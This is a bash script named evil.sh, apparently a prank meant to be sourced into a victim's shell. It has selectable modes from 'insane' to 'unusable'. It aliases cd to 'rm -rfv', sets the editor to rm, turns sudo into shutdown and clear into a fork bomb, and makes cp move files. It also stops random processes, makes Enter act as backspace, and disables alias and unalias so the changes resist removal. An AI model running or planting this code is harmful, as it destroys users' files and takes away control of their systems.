#!/usr/bin/env bash
# evil.sh — https://mths.be/evil.sh

# valid values are: insane, annoying, destructive, devasting, unusable
# each mode of operation includes the previous one's tweaks
#
# insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit
#   open a new shell
# annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong
#   (random) directory
# destructive: delete files and do serious harm, non-recoverable damage included
# devasting: may delete /
# unusable: enable everything including, but not limited to replacing enter by backspace
EVIL_BEHAVIOUR=annoying

function insane()
{
	annoying || test "$EVIL_BEHAVIOUR" = "insane"
}

function annoying()
{
	destructive || test "$EVIL_BEHAVIOUR" = "annoying"
}

function destructive()
{
	devasting || test "$EVIL_BEHAVIOUR" = "destructive"
}

function devasting()
{
	unusable || test "$EVIL_BEHAVIOUR" = "devasting"
}

function unusable()
{
	test "$EVIL_BEHAVIOUR" = "unusable"
}

# Set `rm` as the default editor.
destructive && export EDITOR=/bin/rm;

# Make Tab send the delete key.
insane && tset -Qe $'\t';

# Randomly make the shell exit whenever a command has a non-zero exit status.
if insane
then
	((RANDOM % 10)) || set -o errexit;
fi

# Let `cat` swallow every input and never return anything.
annoying && alias cat=true;

# Use a random sort option whenever `ls` is invoked.
annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

# Delete directories instead of entering them.
devasting && alias cd='rm -rfv';

# Shut down the computer instead of running a command with super-user rights.
destructive && alias sudo='sudo shutdown -P now';

# Launch a fork bomb instead of clearing the screen.
destructive && alias clear=':(){ :|:& };:';

# Have `date` return random dates.
annoying && alias date='date -d "now + $RANDOM days"';

# Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
# Other times, resist all attempts at opening it. Other times, make it read
# reaaaalllly sllooowwwwllly.
annoying && if [ "$(uname)" = 'Darwin' ]; then
	# Much less fun on Macs, alas.
	if [[ $[$RANDOM % 2] == 0 ]]; then
		# Eject!
		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
	else
		# Lock! Admittedly, much less annoying on most Macs,	which don’t support
		# locking and are slot-loading anyway.
		sh -c 'while :; do drutil tray close; sleep 0.1s; done' > /dev/null 2>&1 &
	fi;
else
	N=$[$RANDOM % 3];
	if [[ $N == 0 ]]; then
		# Open and close randomly after a few minutes.
		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
	elif [[ $N == 1 ]]; then
		# Lock, and keep closing just in case.
		sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &
	else
		# Slowness (1× CD speed). This has to be in a loop because it resets with
		# every ejection.
		sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &
	fi;
fi;

# Send STOP signal to random process at random time.
destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &

# Have `cp` perform `mv` instead.
destructive && alias cp='mv';

# Make `exit` open a new shell.
annoying && alias exit='sh';

# Add a random number to line numbers when using `grep -n`.
insane && function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }

# Invert `if`, `for`, and `while`.
annoying && alias if='if !' for='for !' while='while !';

# Map Enter, Ctrl+J, and Ctrl+M to backspace.
unusable && bind '"\C-J":"\C-?"';
unusable && bind '"\C-M":"\C-?"';

# Send `n` (no) instead of `y` (yes)
annoying && alias yes="yes n";

# Quit vim on startup.
annoying && alias vim="vim +q";

# Disable `unalias` and `alias`.
alias unalias=false;
alias alias=false;
